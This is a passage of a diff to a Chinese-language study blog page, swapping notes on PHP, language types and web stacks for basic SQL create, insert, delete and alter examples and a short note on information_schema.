-<p>如：<code>PHP</code>，<code>Python</code>，<code>Shell</code><br>由上到下解释每一行<br>特点：每次使用，每次解释，且需要解释器<br>兼容性问题基本没有</p>
-</blockquote>
-</li>
-<li><p>编译型语言</p>
-<blockquote>
-<p>如：<code>C</code>,<code>C++</code>，<code>Java</code><br>需要编译才能执行（将文本文件<code>test.c</code>编译成二进制文件<code>test.exe</code>）<br>编译后生成二进制文件，让系统执行<br>特点：一次编译，多次使用；但跨平台性较弱，需要修改源码。<br>比如c语言有如下两个标准：</p>
-<blockquote>
-<p><code>c90+win</code>编译标准<br><code>c99+linux</code>编译标准<br>他们不能通用</p>
-</blockquote>
-</blockquote>
-</li>
-</ol>
-<hr>
-<h3 id="PHP与JSP"><a href="#PHP与JSP" class="headerlink" title="PHP与JSP"></a>PHP与JSP</h3><p>PHP适用于小型网站<br>JSP遵循java语法，且用于大型网站<br>中型网站两者混用</p>
-<hr>
-<h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>例子：</p>
-<blockquote>
-<p>使用php输出that’s ok</p>
-<ol>
-<li>使用双引号中插入单引号</li>
-<li>使用单引号，但时加上转义字符<code>\</code></li>
-</ol>
-</blockquote>
-<hr>
-<h3 id="PHP中布尔类型特点"><a href="#PHP中布尔类型特点" class="headerlink" title="PHP中布尔类型特点"></a>PHP中布尔类型特点</h3><p>只要“错”就是“空”，但是一旦被赋为某种类型，就与“空”没有关系了</p>
-<h3 id="常见网站搭建套路（铁三角）"><a href="#常见网站搭建套路（铁三角）" class="headerlink" title="常见网站搭建套路（铁三角）"></a>常见网站搭建套路（铁三角）</h3><blockquote>
-<p><code>apache/nginx + php + mysql</code> 开源<code>(php)</code>全家桶<br><code>tomcat + jsp + oracle</code>     其中<code>java，oracle</code>不开源<br><code>iis + asp + mssql/access</code>    微软全家桶，贵，功能少，质量差(常见于建站早，更换搭建方式代价极高的网站)</p>
-</blockquote>
-<hr>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>以规则对抗规则，即防御规则对抗攻击规则<br>写100条防御语句，找出一条没被防御到的语句</p>
-<p>fuzz：模糊规则</p>
+<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><p><strong>增</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 新增数据库</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">name</span>;  <br><br><span class="hljs-comment"># 新增数据表</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table_name(<br>    column_name column_type<br>)ending=<span class="hljs-keyword">Innodb</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">charset</span>=utf8;<br><br><span class="hljs-comment"># 新增一行数据</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name(field1, field2,...,fieldN)<br>	<span class="hljs-keyword">values</span>(value1, value2,...,valueN);<br></code></pre></td></tr></table></figure></p>
+<p><strong>删</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 删除数据库</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> dbname;<br><br><span class="hljs-comment"># 删除数据表</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> tablename;<br><br><span class="hljs-comment"># 删除一行或多行数据</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> tablename <span class="hljs-keyword">where</span> columnname=?;<br></code></pre></td></tr></table></figure></p>
+<p><strong>改</strong><br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 修改数据库</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> tablename <span class="hljs-keyword">drop</span>/<span class="hljs-keyword">add</span>/<span class="hljs-keyword">modify</span> columnname;<br><br><span class="hljs-comment"># 修改一行或多行数据</span><br><span class="hljs-keyword">update</span> tablename <span class="hljs-keyword">set</span> filed1=<span class="hljs-keyword">new</span>-value1,<br></code></pre></td></tr></table></figure></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>存放当前“数据库应用”中所用数据的“元数据”</p>
 
       
     </main>
@@ -417,9 +199,9 @@
       
       <div class="post-tags">
         
-        <a class="post-tag button" href="/tags/PHP/" rel="tag"><i class="fas fa-tags"></i>PHP</a>
+        <a class="post-tag button" href="/tags/Database/" rel="tag"><i class="fas fa-tags"></i>Database</a>
         
-        <a class="post-tag button" href="/tags/Back-end/" rel="tag"><i class="fas fa-tags"></i>Back-end</a>
+        <a class="post-tag button" href="/tags/SQL/" rel="tag"><i class="fas fa-tags"></i>SQL</a>
         
       </div>
       
@@ -428,7 +210,7 @@
   
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fas fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/6/"><i class="fas fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fas fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/6/"><i class="fas fa-angle-right" aria-label="下一页"></i></a>
   </nav>
   
   
@@ -458,7 +240,7 @@
     
     <div class="archives-count">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">14</a></div>
+      <div><a href="/archives/">15</a></div>
     </div>
     
     
@@ -476,7 +258,7 @@
     
     <div class="tags-count">
       <div class="site-count-title">标签</div>
-      <div><a href="/tags/">27</a></div>
+      <div><a href="/tags/">29</a></div>
     </div>
     
   </div>
